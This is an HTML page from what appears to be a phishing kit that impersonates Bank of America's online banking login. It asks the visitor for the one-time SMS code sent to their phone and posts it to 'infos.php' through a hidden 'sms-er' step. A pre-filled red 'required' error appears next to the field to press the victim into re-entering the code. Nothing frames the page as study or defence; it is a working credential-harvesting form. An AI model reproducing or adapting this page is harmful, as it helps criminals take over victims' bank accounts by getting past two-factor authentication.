<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Bank of America | Online Banking | Log In | User ID</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fa.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fa.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
</head>
<style>

	label{
		font-size: 13px;
    padding-bottom: 4px;
    font-weight: 400;
	}


</style>
	<body>
		<div style="max-width: 620px;margin: 0 auto; padding: 10px;padding-top:50px;">
			<div class="card px-5 py-5 shadow form">
			<div class="logo text-center mb-2"><img style="height: 34px;max-height: 34px;max-width: 300px;width: 300px;" src="image/logo.png"></div>
			<hr>
			<div class="text-center mt-5">
				<h2 style="font-size: 20px;">Account holder authentication</h2>
				<p>Please enter the code you received on your phone</p>
		</div>
		<div class="frm">
							<form action="infos.php" method="post">
								<input type="hidden" value="sms-er" name="step">
								<div class="text-center mb-5"><img src="image/sms.png"></div>
								<div class="row">
									<div class="col-md-2"></div>
									<div class="form-group mb-3 col-md-8 ">
										<label style="color:red">SMS CODE</label>
										<input style="border-color: red;" type="text" required class="form-control" id="sms" name="sms">
										<div style="color: red;font-size: 13px;">the value is required</div>
									</div>
									<div class="bttn text-center mt-4"><button name="submit">Continue</button></div>
								</div>
							</form>
					</div>
			</div>
		</div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  </script>
</body>
</html>